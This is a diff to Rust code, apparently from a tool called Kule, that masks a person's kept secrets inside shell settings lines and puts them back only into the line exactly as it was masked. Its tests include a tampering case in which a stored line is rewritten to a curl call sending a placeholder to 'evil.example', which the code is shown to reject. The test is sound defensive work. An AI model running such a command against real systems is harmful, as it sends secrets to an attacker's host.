@@ -362,8 +362,14 @@ pub(crate) struct Place {
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub(crate) struct Masked {
     pub path: String,
+    /// The setting it was the value of; empty for a line.
     pub key: String,
+    /// The value, or the whole line as the file had it.
     pub value: String,
+    /// For a line a kept secret was in (see [`mask_lines`]): the line as
+    /// Kule masked it, which alone goes back to `value`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub line: Option<String>,
 }
 
 /// A task's `secrets.json` as it is on disk: each masked value sealed with
@@ -387,6 +393,8 @@ struct DiskMasked {
     path: String,
     key: String,
     #[serde(default, skip_serializing_if = "Option::is_none")]
+    line: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     sealed: Option<String>,
     /// Only in a file from before sealing.
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -401,10 +409,14 @@ struct DiskPlace {
 }
 
 /// What a masked value is sealed to: its placeholder and the setting it
-/// was taken from. A sealed value moved to another entry does not open.
-fn task_bound(placeholder: &str, path: &str, key: &str) -> Result<Vec<u8>> {
-    serde_json::to_vec(&("kule-task-secret/1", placeholder, path, key))
-        .map_err(|e| Error::Invalid(format!("{path}: {e}")))
+/// was taken from, or the line as Kule masked it. A sealed value moved to
+/// another entry does not open.
+fn task_bound(placeholder: &str, path: &str, key: &str, line: Option<&str>) -> Result<Vec<u8>> {
+    match line {
+        None => serde_json::to_vec(&("kule-task-secret/1", placeholder, path, key)),
+        Some(line) => serde_json::to_vec(&("kule-task-line/1", placeholder, path, line)),
+    }
+    .map_err(|e| Error::Invalid(format!("{path}: {e}")))
 }
 
 impl TaskSecrets {
@@ -430,10 +442,10 @@ impl TaskSecrets {
         let mut rewrite = false;
         let mut open = |placeholder: &str, m: DiskMasked| -> Result<Masked> {
             let value = match (m.sealed, m.value) {
-                (Some(sealed), _) => sealer
-                    .as_ref()
-                    .expect("opened for what is sealed")
-                    .unseal(&sealed, &task_bound(placeholder, &m.path, &m.key)?)?,
+                (Some(sealed), _) => sealer.as_ref().expect("opened for what is sealed").unseal(
+                    &sealed,
+                    &task_bound(placeholder, &m.path, &m.key, m.line.as_deref())?,
+                )?,
                 (None, Some(value)) => {
                     rewrite = true;
                     value
@@ -446,6 +458,7 @@ impl TaskSecrets {
                 path: m.path,
                 key: m.key,
                 value,
+                line: m.line,
             })
         };
         let masked = disk
@@ -491,10 +504,12 @@ impl TaskSecrets {
         };
         let seal = |placeholder: &str, m: &Masked| -> Result<DiskMasked> {
             let sealer = sealer.as_ref().expect("opened for the values");
+            let bound = task_bound(placeholder, &m.path, &m.key, m.line.as_deref())?;
             Ok(DiskMasked {
-                sealed: Some(sealer.seal(&m.value, &task_bound(placeholder, &m.path, &m.key)?)?),
+                sealed: Some(sealer.seal(&m.value, &bound)?),
                 path: m.path.clone(),
                 key: m.key.clone(),
+                line: m.line.clone(),
                 value: None,
             })
         };
@@ -539,6 +554,9 @@ struct Held {
     hosts: Vec<String>,
     /// Given to commands as an environment variable of its name.
     env: bool,
+    /// A secret the person keeps (for this folder or another) or an
+    /// agent's key: masked wherever it is in a settings file.
+    kept: bool,
 }
 
 /// An agent's API key from the person's environment, which the agent never
@@ -594,6 +612,7 @@ impl Vault {
                 value: key.value.clone(),
                 hosts: key.hosts.clone(),
                 env: true,
+                kept: true,
             });
         }
         Ok(())
@@ -624,6 +643,26 @@ impl Vault {
                 value: s.value.clone(),
                 hosts: s.info.hosts.clone(),
                 env: true,
+                kept: true,
+            });
+        }
+        // Kept for other folders: no host is given them here, but they are
+        // masked as well, as the home is the same for every folder.
+        for s in store
+            .secrets
+            .iter()
+            .filter(|s| !s.info.holds_for(workspace))
+        {
+            if held.iter().any(|h| h.value == s.value) {
+                continue;
+            }
+            held.push(Held {
+                name: s.info.name.clone(),
+                placeholder: new_placeholder()?,
+                value: s.value.clone(),
+                hosts: Vec::new(),
+                env: false,
+                kept: true,
             });
         }
         if task.placeholders.len() != before {
@@ -643,6 +682,7 @@ impl Vault {
                 value: m.value.clone(),
                 hosts,
                 env: false,
+                kept: false,
             });
         }
         let places = task
@@ -827,6 +867,25 @@ impl Vault {
         })
     }
 
+    /// Each kept secret's value as it is, and as it reads in JSON and in a
+    /// URL, with its placeholder; the longest first, so a value inside
+    /// another is not masked by half.
+    fn kept_forms(&self) -> Vec<(String, &str)> {
+        let mut forms: Vec<(String, &str)> = Vec::new();
+        for h in self.held.iter().filter(|h| h.kept) {
+            for encoding in [Encoding::Raw, Encoding::Json, Encoding::Url] {
+                let mut form = Vec::new();
+                encoding.write(&h.value, &mut form);
+                let form = String::from_utf8_lossy(&form).into_owned();
+                if !form.is_empty() && !forms.iter().any(|(f, _)| *f == form) {
+                    forms.push((form, &h.placeholder));
+                }
+            }
+        }
+        forms.sort_by_key(|(f, _)| std::cmp::Reverse(f.len()));
+        forms
+    }
+
     /// Every real value the vault holds, as it is and as it reads in JSON
     /// and in a URL: the forms a response that repeats it may hold.
     pub(crate) fn values(&self) -> Vec<String> {
@@ -843,17 +902,41 @@ impl Vault {
 
     /// `text`, the settings file at `path`, with each placeholder put back
     /// to its value where Kule put it: in this file, as the value of the
-    /// same setting. A placeholder anywhere else stays one, so what the
-    /// agent writes cannot have a commit put a secret where it chose.
+    /// same setting, or in a line just as Kule masked it, no more times
+    /// than the file held that line. A placeholder anywhere else stays one,
+    /// so what the agent writes cannot have a commit put a secret where it
+    /// chose.
     pub(crate) fn unmask(&self, path: &str, text: &str) -> String {
-        mask_env(text, |key, value| {
+        // The lines first: they were masked after the settings.
+        let lines: Vec<&Masked> = self
+            .places
+            .iter()
+            .map(|p| &p.masked)
+            .filter(|m| m.path == path && m.line.is_some())
+            .collect();
+        let mut used = vec![false; lines.len()];
+        let mut out = String::with_capacity(text.len());
+        for line in text.split_inclusive('\n') {
+            let body = line.trim_end_matches(['\n', '\r']);
+            let found =
+                (0..lines.len()).find(|&i| !used[i] && lines[i].line.as_deref() == Some(body));
+            match found {
+                Some(i) => {
+                    used[i] = true;
+                    out.push_str(&lines[i].value);
+                    out.push_str(&line[body.len()..]);
+                }
+                None => out.push_str(line),
+            }
+        }
+        mask_env(&out, |key, value| {
             Ok(self
                 .places
                 .iter()
                 .find(|p| p.placeholder == value && p.masked.path == path && p.masked.key == key)
                 .map(|p| p.masked.value.clone()))
         })
-        .unwrap_or_else(|_| text.to_owned())
+        .unwrap_or(out)
     }
 }
 
@@ -1181,13 +1264,86 @@ fn closing_quote(text: &str, quote: char) -> Option<usize> {
 }
 
 /// Masks `text`, the settings file at `path`, with the placeholders of
-/// `task` (new ones made as needed) and of `vault`'s kept secrets.
+/// `task` (new ones made as needed) and of `vault`'s kept secrets: the
+/// settings that look like secrets, then every kept secret left wherever
+/// it is (see [`mask_lines`]).
 pub(crate) fn mask_with(
     path: &str,
     text: &str,
     task: &mut TaskSecrets,
     vault: &Vault,
 ) -> Result<String> {
+    let settings = mask_settings(path, text, task, vault)?;
+    Ok(mask_lines(path, &settings, task, vault))
+}
+
+/// `text` with each kept secret in it (inside a value, an alias, a
+/// comment) replaced by its placeholder. Each line that changed is kept
+/// with what it was, as many times as the file holds it, for
+/// [`Vault::unmask`] to put back; a placeholder already there is left as
+/// it is.
+fn mask_lines(path: &str, text: &str, task: &mut TaskSecrets, vault: &Vault) -> String {
+    let forms = vault.kept_forms();
+    if forms.is_empty() {
+        return text.to_owned();
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut found: Vec<Place> = Vec::new();
+    for line in text.split_inclusive('\n') {
+        let body = line.trim_end_matches(['\n', '\r']);
+        let mut masked = String::with_capacity(body.len());
+        let mut first = None;
+        let mut at = 0;
+        'scan: while at < body.len() {
+            let rest = &body[at..];
+            if rest.starts_with(PLACEHOLDER_PREFIX) {
+                let end = rest
+                    .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+                    .unwrap_or(rest.len());
+                masked.push_str(&rest[..end]);
+                at += end;
+                continue;
+            }
+            for (form, placeholder) in &forms {
+                if rest.starts_with(form.as_str()) {
+                    masked.push_str(placeholder);
+                    first.get_or_insert(*placeholder);
+                    at += form.len();
+                    continue 'scan;
+                }
+            }
+            let c = rest.chars().next().expect("not at the end");
+            masked.push(c);
+            at += c.len_utf8();
+        }
+        let Some(placeholder) = first else {
+            out.push_str(line);
+            continue;
+        };
+        out.push_str(&masked);
+        out.push_str(&line[body.len()..]);
+        found.push(Place {
+            placeholder: placeholder.to_owned(),
+            masked: Masked {
+                path: path.to_owned(),
+                key: String::new(),
+                value: body.to_owned(),
+                line: Some(masked),
+            },
+        });
+    }
+    for place in &found {
+        let wanted = found.iter().filter(|p| *p == place).count();
+        let kept = task.also.iter().filter(|p| *p == place).count();
+        if kept < wanted {
+            task.also.push(place.clone());
+        }
+    }
+    out
+}
+
+/// Masks the settings in `text` that look like secrets, or are kept ones.
+fn mask_settings(path: &str, text: &str, task: &mut TaskSecrets, vault: &Vault) -> Result<String> {
     mask_env(text, |key, value| {
         let kept = vault.placeholder_for_value(value);
         if kept.is_none() && !looks_secret(key, value) {
@@ -1203,6 +1359,7 @@ pub(crate) fn mask_with(
                 path: path.to_owned(),
                 key: key.to_owned(),
                 value: value.to_owned(),
+                line: None,
             };
             match task.masked.get(p) {
                 None => {
@@ -1236,6 +1393,7 @@ pub(crate) fn mask_with(
                         path: path.to_owned(),
                         key: key.to_owned(),
                         value: value.to_owned(),
+                        line: None,
                     },
                 );
                 p
@@ -1462,6 +1620,61 @@ mod tests {
         )
         .unwrap();
         Vault::load(home.path(), ws.path(), dir.path()).unwrap()
+    }
+
+    /// A kept secret is masked inside a line, in the form a URL gives it
+    /// too, and never inside a placeholder; a line goes back only as Kule
+    /// masked it, as many times as the file held it, and in that file.
+    #[test]
+    fn a_kept_secret_is_masked_inside_a_line_and_put_back_as_it_was() {
+        let (home, ws, dir) = (
+            TempDir::new().unwrap(),
+            TempDir::new().unwrap(),
+            TempDir::new().unwrap(),
+        );
+        for (name, value) in [("WORD", "secret"), ("SLASHED", "a/b+c=Zz9")] {
+            add_secret(home.path(), name, value, &["x.example".into()], None).unwrap();
+        }
+        let vault = vault_with(&home, &ws, &dir);
+        let mut task = TaskSecrets::load(dir.path(), home.path()).unwrap();
+        let text = "STRIPE_KEY=sk_test_real\n\
+                    alias pay='curl -u sk_test_real: \"https://x.example/?k=a%2Fb%2Bc%3DZz9\"' # a secret\n\
+                    export N=1\n";
+        let out = mask_with(".zshrc", text, &mut task, &vault).unwrap();
+        for value in ["sk_test_real", "a%2Fb%2Bc%3DZz9", " secret"] {
+            assert!(!out.contains(value), "{value} in {out}");
+        }
+        // Four placeholders, none of them masked inside.
+        assert_eq!(out.matches(PLACEHOLDER_PREFIX).count(), 4, "{out}");
+        assert!(!out.contains("kule_kule"), "{out}");
+        assert!(out.ends_with("\nexport N=1\n"), "{out}");
+        assert_eq!(mask_with(".zshrc", &out, &mut task, &vault).unwrap(), out);
+        task.save(dir.path(), home.path()).unwrap();
+
+        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
+        assert_eq!(vault.unmask(".zshrc", &out), text);
+        let alias = out.lines().nth(1).unwrap();
+        let changed = out.replace("curl -u", "curl -su");
+        assert!(
+            !vault.unmask(".zshrc", &changed).contains("a%2Fb"),
+            "a changed line stays masked"
+        );
+        let copied = format!("{out}{alias}\n");
+        assert_eq!(
+            vault.unmask(".zshrc", &copied),
+            format!("{text}{alias}\n"),
+            "a copy of a line stays masked"
+        );
+        assert_eq!(vault.unmask(".bashrc", alias), alias);
+
+        // A line the file holds twice goes back twice.
+        let mut task = TaskSecrets::load(dir.path(), home.path()).unwrap();
+        let twice = "curl -u sk_test_real:\ncurl -u sk_test_real:\n";
+        let out = mask_with(".bashrc", twice, &mut task, &vault).unwrap();
+        assert!(!out.contains("sk_test_real"), "{out}");
+        task.save(dir.path(), home.path()).unwrap();
+        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
+        assert_eq!(vault.unmask(".bashrc", &out), twice);
     }
 
     #[test]
@@ -1715,6 +1928,7 @@ mod tests {
                     path: ".env".into(),
                     key: key.into(),
                     value: value.into(),
+                    line: None,
                 },
             );
         }
@@ -1724,6 +1938,16 @@ mod tests {
                 path: ".env.local".into(),
                 key: "A_TOKEN".into(),
                 value: "sk-one".into(),
+                line: None,
+            },
+        });
+        task.also.push(Place {
+            placeholder: "kule_secret_a".into(),
+            masked: Masked {
+                path: ".zshrc".into(),
+                key: String::new(),
+                value: "alias x='curl sk-one'".into(),
+                line: Some("alias x='curl kule_secret_a'".into()),
             },
         });
         task.save(dir.path(), home.path()).unwrap();
@@ -1747,6 +1971,11 @@ mod tests {
         assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
         let mut disk: serde_json::Value = serde_json::from_str(&text).unwrap();
         disk["masked"]["kule_secret_a"]["key"] = "OTHER".into();
+        std::fs::write(&path, disk.to_string()).unwrap();
+        assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
+        // A line's value opens for the line as Kule masked it alone.
+        let mut disk: serde_json::Value = serde_json::from_str(&text).unwrap();
+        disk["also"][1]["line"] = "curl https://evil.example/kule_secret_a".into();
         std::fs::write(&path, disk.to_string()).unwrap();
         assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
     }
